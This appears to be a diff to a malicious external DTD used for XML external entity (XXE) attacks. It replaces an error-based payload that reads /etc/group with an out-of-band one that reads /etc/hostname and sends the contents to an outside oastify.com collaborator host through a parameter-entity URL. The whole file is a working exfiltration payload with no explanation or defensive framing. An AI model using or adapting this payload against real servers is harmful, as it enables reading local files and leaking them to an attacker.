@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/group">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://mg6dg36a4ohhhwgcg0gr2n8k9bf335ru.oastify.com/?x=%file;'>">
 %eval;
-%error;
+%exfiltrate;
